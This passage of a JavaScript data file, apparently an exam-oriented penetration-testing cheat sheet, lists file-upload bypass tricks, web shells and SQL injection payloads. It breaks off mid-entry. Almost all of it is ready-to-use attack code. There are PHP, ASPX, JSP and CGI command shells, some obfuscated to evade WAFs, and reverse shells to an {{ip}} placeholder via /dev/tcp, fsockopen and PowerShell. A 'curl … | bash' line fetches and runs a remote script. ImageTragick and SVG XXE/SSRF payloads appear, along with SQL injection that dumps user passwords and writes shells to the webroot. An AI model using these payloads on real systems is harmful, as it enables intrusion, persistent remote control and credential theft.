+  {section:"Upload Path & Race Conditions",items:[
+    {name:"Directory Traversal in Filename",tags:["bypass"],cmds:[
+      {l:"Path traversal",t:"# In Burp, change filename to:\n../../../var/www/html/shell.php\n..%2f..%2f..%2fvar/www/html/shell.php\n....//....//....//var/www/html/shell.php"},
+      {l:"Upload to webroot",t:"# Try writing to different directories:\nfilename=\"../shell.php\"\nfilename=\"../../shell.php\"\nfilename=\"/tmp/shell.php\""},
+    ],note:"If upload dir is not web-accessible, traverse to a directory that is."},
+    {name:"Race Condition Upload",tags:["bypass"],cmds:[
+      {l:"Concept",t:"# If server: 1) saves file, 2) validates, 3) deletes if invalid\n# Race: access file between step 1 and 3\n\n# Terminal 1 - rapid upload loop:\nfor i in $(seq 1 100); do\n  curl -X POST http://{{target}}/upload -F 'file=@shell.php'\ndone"},
+      {l:"Access loop",t:"# Terminal 2 - rapid access loop:\nfor i in $(seq 1 100); do\n  curl http://{{target}}/uploads/shell.php?cmd=id 2>/dev/null | grep -q uid && echo \"GOT IT\" && break\ndone"},
+    ],note:"Works against upload->validate->delete workflows. Use threads for speed."},
+    {name:"ZIP/Archive Upload",tags:["bypass"],cmds:[
+      {l:"Zip slip",t:"# Create zip with path traversal:\nln -s /etc/passwd symlink.txt\nzip --symlinks evil.zip symlink.txt\n\n# Or zip containing shell:\nzip evil.zip shell.php\n# If app extracts zip, shell.php lands in upload dir"},
+      {l:"PHP phar",t:"# Create phar archive:\n\x3c?php\n$p = new Phar('shell.phar');\n$p['shell.php'] = '\x3c?php system($_GET[\"cmd\"]); ?>';\n$p->setStub('\x3c?php __HALT_COMPILER(); ?>');\n# Upload shell.phar, access via phar:// wrapper"},
+    ],note:"Some apps accept archives and extract them."},
+  ]},
+  {section:"Upload Discovery & Post-Upload",items:[
+    {name:"Find Upload Directory",tags:["cmd"],cmds:[
+      {l:"Source code",t:"# Check page source for upload path:\ncurl -s http://{{target}}/upload | grep -i 'action\\|form\\|upload\\|img src'"},
+      {l:"Common paths",t:"# Try common upload directories:\n/uploads/ /upload/ /files/ /images/ /media/\n/wp-content/uploads/ /assets/uploads/\n/tmp/ /storage/ /public/uploads/"},
+      {l:"Gobuster",t:"gobuster dir -u http://{{target}} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php -q | grep -i upload"},
+    ],note:"After upload, you need to find where the file was stored to execute it."},
+    {name:"Execute Uploaded Shell",tags:["cmd","rce"],cmds:[
+      {l:"Direct access",t:"curl http://{{target}}/uploads/shell.php?cmd=id"},
+      {l:"RFI include",t:"# If app has LFI/RFI, include uploaded file:\nhttp://{{target}}/page.php?file=uploads/shell.php"},
+      {l:"PHP filter",t:"# Read upload source to confirm location:\nhttp://{{target}}/page.php?file=php://filter/convert.base64-encode/resource=upload.php"},
+    ],note:"Some uploads rename files. Check response for new filename."},
+  ]},
+  {section:"SVG & ImageMagick Upload",items:[
+    {name:"SVG Upload -> XXE / XSS",tags:["bypass"],cmds:[
+      {l:"SVG XXE read file",t:"# Upload this as shell.svg:\n\x3c?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\x3c!DOCTYPE svg [ \x3c!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n\x3csvg xmlns=\"http://www.w3.org/2000/svg\">\n  \x3ctext x=\"0\" y=\"20\">&xxe;\x3c/text>\n\x3c/svg>"},
+      {l:"SVG XSS",t:"# Upload this as xss.svg:\n\x3csvg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.cookie)\">\n  \x3ccircle r=\"50\"/>\n\x3c/svg>"},
+      {l:"SVG SSRF",t:"\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE svg [ \x3c!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\"> ]>\n\x3csvg xmlns=\"http://www.w3.org/2000/svg\">\x3ctext>&xxe;\x3c/text>\x3c/svg>"},
+    ],note:"If app processes SVGs (renders, converts, displays inline), these execute. SVG is XML so XXE applies."},
+    {name:"ImageMagick Exploit (ImageTragick)",tags:["rce"],cmds:[
+      {l:"CVE-2016-3714",t:"# Upload as exploit.mvg or exploit.svg:\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://example.com/image.jpg\"|id\")'\npop graphic-context"},
+      {l:"Reverse shell",t:"push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://x.com/x.jpg\"|bash -i >& /dev/tcp/{{ip}}/{{sport}} 0>&1\")'\npop graphic-context"},
+      {l:"File read via label",t:"# Upload as exploit.png with content:\npush graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'label:@/etc/passwd'\npop graphic-context"},
+    ],note:"If server uses ImageMagick to process images (resize, convert, thumbnail). Check for convert, mogrify, identify binaries."},
+  ]},
+  {section:"Exam Scenarios (Step-by-Step)",items:[
+    {name:"Bypass Blacklist + Whitelist Combo",tags:["bypass"],cmds:[
+      {l:"Full steps",t:"# Scenario: upload form blocks .php but allows images\n# Step 1: Intercept with Burp (bypass client-side JS)\n# Step 2: Try .phtml extension (bypasses .php blacklist)\n#   -> If blocked, try .php5, .pht, .phps, .phar\n# Step 3: If whitelist only allows .jpg/.png/.gif:\n#   -> Use double extension: shell.php.jpg\n#   -> Or null byte: shell.php%00.jpg\n# Step 4: Set Content-Type: image/jpeg in Burp\n# Step 5: Prepend GIF89a; to PHP code for magic byte check\n# Step 6: Final payload:\nGIF89a;\n\x3c?php system($_GET['cmd']); ?>\n# Save as: shell.phtml (or shell.php.jpg)\n# Step 7: Find upload path and access:\ncurl http://TARGET/uploads/shell.phtml?cmd=id"},
+    ],note:"This is the combined bypass the exam tests. Try each filter individually, then stack all bypasses together."},
+    {name:"Upload When Dir Not Web-Accessible",tags:["bypass","rce"],cmds:[
+      {l:"Strategy",t:"# If uploads/ isn't browseable:\n# 1. Check for LFI to include the uploaded file:\n#    page.php?file=../uploads/shell.php\n# 2. Try path traversal in filename to write to webroot:\n#    filename=\"../../../var/www/html/shell.php\"\n# 3. If app shows image via param: image.php?file=uploads/X\n#    -> Upload PHP, access via that param\n# 4. Upload .htaccess first to make uploads/ execute PHP\n# 5. Check if app returns full path in response/error"},
+      {l:"Path discovery",t:"# Find where uploads go:\n# 1. Check response after upload for path/URL\n# 2. Read source: php://filter/convert.base64-encode/resource=upload.php\n# 3. Check common paths:\ncurl -s http://{{target}}/uploads/ http://{{target}}/upload/ http://{{target}}/files/ http://{{target}}/images/ http://{{target}}/media/ http://{{target}}/tmp/"},
+    ],note:"When you can upload but can't directly access the file, chain with LFI or path traversal."},
+    {name:"Upload Size Limit Bypass",tags:["bypass"],cmds:[
+      {l:"Minimal shells",t:"# Smallest possible PHP shells:\n\x3c?=`$_GET[0]`?>\n# 19 bytes! Usage: shell.php?0=id\n\n\x3c?php system($_GET[1]);?>\n# 27 bytes\n\n\x3c?=system($_GET[c]);?>\n# 24 bytes"},
+      {l:"Chunked upload",t:"# If upload checks Content-Length, try chunked:\ncurl -X POST http://{{target}}/upload \\\n  -H 'Transfer-Encoding: chunked' \\\n  -d @shell.php"},
+    ],note:"When file size is limited, use minimal one-liner shells. The shortest PHP shell is 19 bytes."},
+  ]},
+],
+
+// ─── WEB SHELLS ───
+webshell:[
+  {section:"PHP Web Shells - Basic",items:[
+    {name:"One-liner (system)",tags:["php"],cmds:[
+      {l:"GET",t:"\x3c?php system($_GET['cmd']); ?>"},
+      {l:"POST",t:"\x3c?php system($_POST['cmd']); ?>"},
+      {l:"REQUEST",t:"\x3c?php system($_REQUEST['cmd']); ?>"},
+      {l:"Hidden param",t:"\x3c?php if(isset($_GET['x']))system($_GET['x']); ?>"},
+    ],note:"Simplest shell. Usage: shell.php?cmd=whoami"},
+    {name:"One-liner (exec variants)",tags:["php"],cmds:[
+      {l:"exec",t:"\x3c?php echo exec($_GET['cmd']); ?>"},
+      {l:"shell_exec",t:"\x3c?php echo shell_exec($_GET['cmd']); ?>"},
+      {l:"passthru",t:"\x3c?php passthru($_GET['cmd']); ?>"},
+      {l:"backtick",t:"\x3c?php echo `$_GET['cmd']`; ?>"},
+    ],note:"Different PHP functions for command execution. If one is disabled, try another."},
+    {name:"One-liner (proc_open)",tags:["php"],cmds:[
+      {l:"proc_open",t:"\x3c?php $p=proc_open($_GET['cmd'],array(1=>array('pipe','w'),2=>array('pipe','w')),$o);echo stream_get_contents($o[1]);proc_close($p); ?>"},
+      {l:"popen",t:"\x3c?php $h=popen($_GET['cmd'],'r');echo fread($h,4096);pclose($h); ?>"},
+    ],note:"proc_open and popen are often overlooked in disable_functions."},
+  ]},
+  {section:"PHP Web Shells - Advanced (WAF/Restriction Bypass)",items:[
+    {name:"When system() is Blocked",tags:["php","waf"],cmds:[
+      {l:"Alternatives",t:"\x3c?php\n// Try each until one works:\n$cmd = $_GET['cmd'];\nif(function_exists('exec')){exec($cmd,$o);echo implode(\"\\n\",$o);}\nelseif(function_exists('shell_exec')){echo shell_exec($cmd);}\nelseif(function_exists('passthru')){passthru($cmd);}\nelseif(function_exists('popen')){$h=popen($cmd,'r');echo fread($h,4096);pclose($h);}\nelseif(function_exists('proc_open')){$p=proc_open($cmd,array(1=>array('pipe','w')),$o);echo stream_get_contents($o[1]);}\nelseif(function_exists('pcntl_exec')){pcntl_exec('/bin/bash',array('-c',$cmd));}\n?>"},
+    ],note:"Auto-tries all PHP exec functions. Use when you don't know which are disabled."},
+    {name:"Bypass disable_functions via mail()",tags:["php","bypass"],cmds:[
+      {l:"LD_PRELOAD",t:"# 1. Compile shared library on Kali:\n# bypass.c:\n#include \x3cstdlib.h>\n#include \x3cunistd.h>\nvoid __attribute__((constructor)) init() {\n  system(getenv(\"CMD\"));\n}\n# gcc -shared -fPIC -o bypass.so bypass.c\n\n# 2. Upload bypass.so to target\n# 3. PHP shell:\n\x3c?php\nputenv('CMD='.$_GET['cmd']);\nputenv('LD_PRELOAD=/path/to/bypass.so');\nmail('a','b','c');\n?>"},
+    ],note:"mail() calls sendmail which loads LD_PRELOAD libs. Bypasses disable_functions entirely."},
+    {name:"Bypass via FFI (PHP 7.4+)",tags:["php","bypass"],cmds:[
+      {l:"FFI shell",t:"\x3c?php\n$ffi = FFI::cdef('int system(const char *command);');\n$ffi->system($_GET['cmd']);\n?>"},
+    ],note:"PHP FFI (Foreign Function Interface) can call C functions directly. Rare but powerful."},
+    {name:"Bypass via PHP Built-in Classes",tags:["php","bypass"],cmds:[
+      {l:"SplFileObject",t:"\x3c?php\n// Read files when exec disabled:\n$f = new SplFileObject($_GET['f']);\nforeach($f as $line) echo $line;\n?>"},
+      {l:"GlobIterator",t:"\x3c?php\n// List files:\nforeach(new GlobIterator($_GET['p']) as $f) echo $f.\"\\n\";\n?>"},
+      {l:"DirectoryIterator",t:"\x3c?php\nforeach(new DirectoryIterator($_GET['d']) as $f) echo $f.\"\\n\";\n?>"},
+    ],note:"When ALL exec functions are disabled, use PHP classes to read/list files."},
+    {name:"Obfuscated PHP Shells (WAF Bypass)",tags:["php","waf"],cmds:[
+      {l:"Base64 decode",t:"\x3c?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>"},
+      {l:"Char concat",t:"\x3c?php $a='sys';$b='tem';$c=$a.$b;$c($_GET['cmd']); ?>"},
+      {l:"Variable func",t:"\x3c?php $_=base64_decode;$__='c3lzdGVt';$___=$_($__);$___($_GET['x']); ?>"},
+      {l:"Assert",t:"\x3c?php @assert($_GET['cmd']); ?>"},
+      {l:"Preg_replace",t:"\x3c?php @preg_replace('/.*/e',$_GET['cmd'],''); ?>"},
+      {l:"Create function",t:"\x3c?php $f=create_function('','system($_GET[\"cmd\"]);');$f(); ?>"},
+      {l:"Array map",t:"\x3c?php array_map(function($cmd){system($cmd);},$_REQUEST); ?>"},
+      {l:"Hex encoded",t:"\x3c?php $x=\"\\x73\\x79\\x73\\x74\\x65\\x6d\";$x($_GET['cmd']); ?>"},
+    ],note:"WAF evasion. preg_replace /e only works on PHP \x3c7.0. assert() may be disabled."},
+    {name:"PHP Short Tags & Alternatives",tags:["php","waf"],cmds:[
+      {l:"Short open",t:"\x3c?=`$_GET[0]`?>"},
+      {l:"Short system",t:"\x3c?=system($_GET[0])?>"},
+      {l:"Script tag",t:"\x3cscript language=\"php\">system($_GET['cmd']);\x3c/script>"},
+    ],note:"Short tags need short_open_tag=On. Script tag works on PHP \x3c7.0."},
+  ]},
+  {section:"ASP / ASPX Web Shells",items:[
+    {name:"ASP Classic Web Shell",tags:["asp"],cmds:[
+      {l:"CMD exec",t:"\x3c%\nDim cmd\ncmd = Request(\"cmd\")\nSet shell = Server.CreateObject(\"WScript.Shell\")\nSet exec = shell.Exec(\"cmd.exe /c \" & cmd)\nResponse.Write(exec.StdOut.ReadAll())\n%>"},
+      {l:"One-liner",t:"\x3c%=Server.CreateObject(\"WScript.Shell\").Exec(\"cmd.exe /c \"&Request(\"cmd\")).StdOut.ReadAll()%>"},
+    ],note:"Classic ASP (.asp). Usage: shell.asp?cmd=whoami"},
+    {name:"ASPX Web Shell",tags:["asp"],cmds:[
+      {l:"Full shell",t:"\x3c%@ Page Language=\"C#\" %>\n\x3c%@ Import Namespace=\"System.Diagnostics\" %>\n\x3c%\nstring cmd = Request[\"cmd\"];\nif(cmd != null) {\n  Process p = new Process();\n  p.StartInfo.FileName = \"cmd.exe\";\n  p.StartInfo.Arguments = \"/c \" + cmd;\n  p.StartInfo.UseShellExecute = false;\n  p.StartInfo.RedirectStandardOutput = true;\n  p.Start();\n  Response.Write(\"\x3cpre>\" + p.StandardOutput.ReadToEnd() + \"\x3c/pre>\");\n}\n%>"},
+      {l:"Compact",t:"\x3c%@ Page Language=\"C#\" %>\x3c%@ Import Namespace=\"System.Diagnostics\" %>\x3c%var p=new Process();p.StartInfo.FileName=\"cmd.exe\";p.StartInfo.Arguments=\"/c \"+Request[\"cmd\"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>"},
+    ],note:"ASPX (.aspx) for IIS. Usage: shell.aspx?cmd=whoami"},
+    {name:"ASPX PowerShell Web Shell",tags:["asp"],cmds:[
+      {l:"PS exec",t:"\x3c%@ Page Language=\"C#\" %>\n\x3c%@ Import Namespace=\"System.Management.Automation\" %>\n\x3c%\nusing(var ps = PowerShell.Create()) {\n  ps.AddScript(Request[\"cmd\"]);\n  var results = ps.Invoke();\n  foreach(var r in results) Response.Write(r.ToString() + \"\\n\");\n}\n%>"},
+    ],note:"Execute PowerShell commands. Requires System.Management.Automation."},
+  ]},
+  {section:"JSP Web Shells",items:[
+    {name:"JSP Web Shell",tags:["jsp"],cmds:[
+      {l:"Runtime exec",t:"\x3c%@ page import=\"java.io.*\" %>\n\x3c%\nString cmd = request.getParameter(\"cmd\");\nif(cmd != null) {\n  Process p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",cmd});\n  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n  String line;\n  while((line = br.readLine()) != null) out.println(line);\n}\n%>"},
+      {l:"Windows variant",t:"\x3c%@ page import=\"java.io.*\" %>\n\x3c%\nString cmd = request.getParameter(\"cmd\");\nif(cmd != null) {\n  Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + cmd);\n  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n  String line;\n  while((line = br.readLine()) != null) out.println(line);\n}\n%>"},
+    ],note:"JSP web shell. Usage: shell.jsp?cmd=whoami"},
+    {name:"JSP WAR Deployment",tags:["jsp"],cmds:[
+      {l:"Create WAR",t:"# 1. Create shell.jsp with above content\n# 2. Package as WAR:\nmkdir -p webshell/\ncp shell.jsp webshell/\ncd webshell && jar -cvf ../shell.war *\n# 3. Deploy via Tomcat Manager, JBoss, etc."},
+    ],note:"WAR files auto-deploy on Tomcat/JBoss when placed in deploy directory."},
+  ]},
+  {section:"Reverse Shell Web Shells",items:[
+    {name:"PHP Reverse Shell (pentestmonkey)",tags:["php","rce"],cmds:[
+      {l:"Full shell",t:"\x3c?php\nset_time_limit(0);\n$ip='{{ip}}';$port={{sport}};\n$sock=fsockopen($ip,$port);\n$proc=proc_open('/bin/sh',array(0=>$sock,1=>$sock,2=>$sock),$pipes);\n?>"},
+      {l:"Compact",t:"\x3c?php $s=fsockopen('{{ip}}',{{sport}});$p=proc_open('/bin/sh',array(0=>$s,1=>$s,2=>$s),$x); ?>"},
+      {l:"Windows",t:"\x3c?php $s=fsockopen('{{ip}}',{{sport}});$p=proc_open('cmd.exe',array(0=>$s,1=>$s,2=>$s),$x); ?>"},
+    ],note:"Gives interactive reverse shell. Start listener: nc -lvnp {{sport}}"},
+    {name:"PHP Reverse Shell (full featured)",tags:["php","rce"],cmds:[
+      {l:"Full",t:"\x3c?php\n$ip='{{ip}}';$port={{sport}};\n$sock=fsockopen($ip,$port,$errno,$errstr,30);\nif(!$sock){die();}\n$desc=array(0=>$sock,1=>$sock,2=>$sock);\n$proc=proc_open('/bin/sh -i',$desc,$pipes);\nif(!is_resource($proc)){die();}\nwhile(is_resource($proc)){usleep(100000);}\nfclose($sock);\n?>"},
+    ],note:"Use pentestmonkey's full version for production: /usr/share/webshells/php/php-reverse-shell.php"},
+    {name:"ASPX Reverse Shell",tags:["asp","rce"],cmds:[
+      {l:"Full",t:"# Use: /usr/share/webshells/aspx/cmdasp.aspx\n# Or generate with msfvenom:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST={{ip}} LPORT={{sport}} -f aspx > shell.aspx"},
+    ],note:"Kali includes pre-built ASPX shells in /usr/share/webshells/aspx/"},
+    {name:"JSP Reverse Shell",tags:["jsp","rce"],cmds:[
+      {l:"msfvenom",t:"msfvenom -p java/jsp_shell_reverse_tcp LHOST={{ip}} LPORT={{sport}} -f raw > shell.jsp"},
+      {l:"WAR payload",t:"msfvenom -p java/jsp_shell_reverse_tcp LHOST={{ip}} LPORT={{sport}} -f war > shell.war"},
+    ],note:"Deploy WAR to Tomcat Manager or upload JSP directly."},
+  ]},
+  {section:"Built-in Kali Web Shells",items:[
+    {name:"Kali Web Shell Locations",tags:["cmd"],cmds:[
+      {l:"List all",t:"find /usr/share/webshells/ -type f 2>/dev/null"},
+      {l:"PHP shells",t:"ls /usr/share/webshells/php/\n# php-reverse-shell.php - BEST full reverse shell\n# simple-backdoor.php  - simple \x3c?php system($_GET['cmd']); ?>\n# php-backdoor.php     - interactive browser shell"},
+      {l:"ASPX shells",t:"ls /usr/share/webshells/aspx/\n# cmdasp.aspx - command execution web shell"},
+      {l:"JSP shells",t:"ls /usr/share/webshells/jsp/\n# cmdjsp.jsp - command execution web shell"},
+      {l:"CFM shells",t:"ls /usr/share/webshells/cfm/\n# cfexec.cfm - ColdFusion command execution"},
+    ],note:"Always check /usr/share/webshells/ first. Pre-tested and ready."},
+  ]},
+  {section:"Recon Before Shell (Check What's Disabled)",items:[
+    {name:"Check disable_functions",tags:["php"],cmds:[
+      {l:"Via phpinfo",t:"\x3c?php phpinfo(); ?>\n# Upload phpinfo.php, look for disable_functions row"},
+      {l:"Via ini_get",t:"\x3c?php echo 'Disabled: ' . ini_get('disable_functions'); ?>\n# Shows which functions are blocked"},
+      {l:"Auto-check all",t:"\x3c?php\n$fns = array('system','exec','shell_exec','passthru','popen','proc_open','pcntl_exec','mail','putenv','dl');\nforeach($fns as $f) echo $f . ': ' . (function_exists($f)?'ENABLED':'DISABLED') . \"\\n\";\necho 'open_basedir: ' . ini_get('open_basedir') . \"\\n\";\necho 'safe_mode: ' . ini_get('safe_mode') . \"\\n\";\n?>"},
+    ],note:"ALWAYS check disable_functions FIRST before choosing which shell to upload. Saves time."},
+    {name:"Weevely - Persistent PHP Backdoor",tags:["php","cmd"],cmds:[
+      {l:"Generate",t:"weevely generate {{pass}} /tmp/shell.php\n# Produces obfuscated PHP backdoor"},
+      {l:"Connect",t:"weevely http://{{target}}/uploads/shell.php {{pass}}"},
+      {l:"Features",t:"# Inside weevely session:\n:file_read /etc/passwd\n:file_upload /tmp/linpeas.sh /tmp/linpeas.sh\n:system_info\n:backdoor_reversetcp {{ip}} {{sport}}"},
+    ],note:"Weevely generates password-protected obfuscated PHP agent. Better than raw one-liners for persistence."},
+  ]},
+  {section:"Python / Perl / CGI Web Shells",items:[
+    {name:"Python Web Shell (CGI)",tags:["cmd"],cmds:[
+      {l:"Python CGI",t:"#!/usr/bin/env python3\nimport cgi, subprocess, os\nprint('Content-Type: text/html\\n')\ncmd = cgi.FieldStorage().getvalue('cmd', 'id')\nprint('\x3cpre>' + subprocess.getoutput(cmd) + '\x3c/pre>')"},
+      {l:"Python WSGI",t:"# For Flask/Django apps - inject into template or route:\nimport os\nos.popen(request.args.get('cmd','id')).read()"},
+    ],note:"Save as shell.py in cgi-bin/. Needs execute permission: chmod +x shell.py."},
+    {name:"Perl CGI Web Shell",tags:["cmd"],cmds:[
+      {l:"Perl CGI",t:"#!/usr/bin/perl\nuse CGI;\nmy $q = CGI->new;\nmy $cmd = $q->param('cmd') || 'id';\nprint \"Content-Type: text/html\\n\\n\";\nprint \"\x3cpre>\" . `$cmd` . \"\x3c/pre>\";"},
+    ],note:"Save as shell.cgi or shell.pl in cgi-bin/. chmod +x required."},
+  ]},
+  {section:"Post-Shell Checklist",items:[
+    {name:"After Landing a Web Shell",tags:["cmd","rce"],cmds:[
+      {l:"Linux enum",t:"# Immediate post-shell steps:\nid; whoami; hostname\nuname -a\ncat /etc/os-release\nip addr\nps aux\nenv\nfind / -perm -4000 -type f 2>/dev/null\nsudo -l\ncat /etc/crontab\nls -la /home/\nfind / -writable -type f 2>/dev/null | head -20"},
+      {l:"Windows enum",t:"whoami /all\nipconfig /all\nsysteminfo\nnet user\nnet localgroup administrators\ntasklist /v\nnetstat -anop tcp\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul"},
+      {l:"Upgrade to revshell",t:"# Get proper reverse shell from web shell:\n# Linux:\nbash -c 'bash -i >& /dev/tcp/{{ip}}/{{sport}} 0>&1'\n# Or via curl:\ncurl http://{{ip}}:{{port}}/shell.sh | bash\n# Windows:\npowershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{ip}}',{{sport}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write([Text.Encoding]::ASCII.GetBytes($o),0,$o.Length)}\""},
+    ],note:"Web shell -> enumerate -> upgrade to full reverse shell -> privesc. Don't stay in web shell longer than needed."},
+  ]},
+],
+
+// ─── SQL INJECTION ───
+sqli:[
+  {section:"Detection & Identification",items:[
+    {name:"Basic SQLi Tests",tags:["sqli"],cmds:[
+      {l:"String test",t:"' OR '1'='1\n' OR '1'='1'--\n' OR '1'='1'#\n' OR '1'='1'/*\n\" OR \"1\"=\"1"},
+      {l:"Numeric test",t:"1 OR 1=1\n1 OR 1=1--\n1 OR 1=1#\n1 UNION SELECT NULL--"},
+      {l:"Error based",t:"'\n''\n`\n``\n,\n\"\n\"\"\n/\n//\n\\\n\\\\"},
+      {l:"Time-based",t:"' OR SLEEP(5)--\n' OR pg_sleep(5)--\n'; WAITFOR DELAY '0:0:5'--\n' OR BENCHMARK(10000000,MD5('a'))--"},
+    ],note:"Start with ' to see if app throws SQL error. Time-based for blind injection."},
+    {name:"Identify Database Type",tags:["sqli"],cmds:[
+      {l:"MySQL",t:"' UNION SELECT @@version--\n' UNION SELECT version()--"},
+      {l:"PostgreSQL",t:"' UNION SELECT version()--\n'; SELECT version();--"},
+      {l:"MSSQL",t:"' UNION SELECT @@version--\n'; EXEC xp_cmdshell('whoami');--"},
+      {l:"Oracle",t:"' UNION SELECT banner FROM v$version WHERE ROWNUM=1--\n' UNION SELECT NULL FROM dual--"},
+      {l:"SQLite",t:"' UNION SELECT sqlite_version()--"},
+    ],note:"Different databases have different syntax. Identify DB first for correct payloads."},
+  ]},
+  {section:"UNION-Based Injection",items:[
+    {name:"Find Column Count",tags:["sqli"],cmds:[
+      {l:"ORDER BY",t:"' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\n# Keep incrementing until you get an error"},
+      {l:"UNION NULL",t:"' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n# Keep adding NULLs until query succeeds"},
+    ],note:"Must match exact column count of original query."},
+    {name:"Extract Data (MySQL)",tags:["sqli"],cmds:[
+      {l:"DB names",t:"' UNION SELECT schema_name,NULL FROM information_schema.schemata--"},
+      {l:"Tables",t:"' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='TARGET_DB'--"},
+      {l:"Columns",t:"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"},
+      {l:"Data",t:"' UNION SELECT username,password FROM users--"},
+      {l:"Concat",t:"' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL FROM users--"},
+    ],note:"Standard MySQL data extraction flow: databases -> tables -> columns -> data."},
+    {name:"Extract Data (MSSQL)",tags:["sqli"],cmds:[
+      {l:"DB names",t:"' UNION SELECT name,NULL FROM master..sysdatabases--"},
+      {l:"Tables",t:"' UNION SELECT name,NULL FROM TARGET_DB..sysobjects WHERE xtype='U'--"},
+      {l:"Columns",t:"' UNION SELECT name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--"},
+      {l:"Data",t:"' UNION SELECT username+':'+password,NULL FROM users--"},
+    ],note:"MSSQL uses + for string concat, master..sysdatabases for DB listing."},
+    {name:"Extract Data (PostgreSQL)",tags:["sqli"],cmds:[
+      {l:"DB names",t:"' UNION SELECT datname,NULL FROM pg_database--"},
+      {l:"Tables",t:"' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--"},
+      {l:"Data",t:"' UNION SELECT username||':'||password,NULL FROM users--"},
+    ],note:"PostgreSQL uses || for string concat."},
+  ]},
+  {section:"Blind SQL Injection",items:[
+    {name:"Boolean-Based Blind",tags:["sqli"],cmds:[
+      {l:"True/False",t:"' AND 1=1--   (true - normal page)\n' AND 1=2--   (false - different page)"},
+      {l:"Extract char",t:"' AND SUBSTRING(@@version,1,1)='5'--\n' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--"},
+      {l:"Extract DB",t:"' AND SUBSTRING(database(),1,1)='a'--\n' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--"},
+    ],note:"Compare true/false responses. Automate with sqlmap for speed."},
+    {name:"Time-Based Blind",tags:["sqli"],cmds:[
+      {l:"MySQL",t:"' AND IF(1=1,SLEEP(5),0)--\n' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--"},
+      {l:"MSSQL",t:"'; IF (1=1) WAITFOR DELAY '0:0:5'--\n'; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'--"},
+      {l:"PostgreSQL",t:"'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"},
+    ],note:"Measures response time. Slower but works when no visible output difference."},
+  ]},
+  {section:"SQLMap Automation",items:[
+    {name:"SQLMap Basic Usage",tags:["cmd"],cmds:[
+      {l:"GET param",t:"sqlmap -u 'http://{{target}}/page?id=1' --batch --dbs"},
+      {l:"POST param",t:"sqlmap -u 'http://{{target}}/login' --data='user=admin&pass=test' --batch --dbs"},
+      {l:"With cookie",t:"sqlmap -u 'http://{{target}}/page?id=1' --cookie='PHPSESSID=abc123' --batch --dbs"},
+      {l:"From Burp",t:"sqlmap -r request.txt --batch --dbs"},
+    ],note:"--batch for non-interactive. -r reads saved Burp request."},
+    {name:"SQLMap Data Extraction",tags:["cmd"],cmds:[
+      {l:"List tables",t:"sqlmap -u 'http://{{target}}/page?id=1' -D target_db --tables --batch"},
+      {l:"Dump table",t:"sqlmap -u 'http://{{target}}/page?id=1' -D target_db -T users --dump --batch"},
+      {l:"Specific cols",t:"sqlmap -u 'http://{{target}}/page?id=1' -D target_db -T users -C username,password --dump --batch"},
+      {l:"Dump all",t:"sqlmap -u 'http://{{target}}/page?id=1' --dump-all --batch"},
+    ],note:"Extract data progressively: databases -> tables -> columns -> dump."},
+    {name:"SQLMap Advanced",tags:["cmd"],cmds:[
+      {l:"OS shell",t:"sqlmap -u 'http://{{target}}/page?id=1' --os-shell --batch"},
+      {l:"File read",t:"sqlmap -u 'http://{{target}}/page?id=1' --file-read='/etc/passwd' --batch"},
+      {l:"File write",t:"sqlmap -u 'http://{{target}}/page?id=1' --file-write='shell.php' --file-dest='/var/www/html/shell.php' --batch"},
+      {l:"Tamper scripts",t:"sqlmap -u 'http://{{target}}/page?id=1' --tamper=space2comment,between --batch --dbs"},
+      {l:"Level/Risk",t:"sqlmap -u 'http://{{target}}/page?id=1' --level=5 --risk=3 --batch --dbs"},
+    ],note:"--os-shell for RCE. --tamper for WAF bypass. --level=5 --risk=3 for thorough testing."},
+  ]},
+  {section:"SQL Injection to RCE",items:[
+    {name:"MySQL File Write (INTO OUTFILE)",tags:["sqli","rce"],cmds:[
+      {l:"Write webshell",t:"' UNION SELECT '\x3c?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"},
+      {l:"Write via LINES",t:"' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '\x3c?php system($_GET[\"cmd\"]); ?>'--"},
+    ],note:"Requires FILE privilege and write access to web directory. secure_file_priv must allow it."},
+    {name:"MSSQL xp_cmdshell",tags:["sqli","rce"],cmds:[
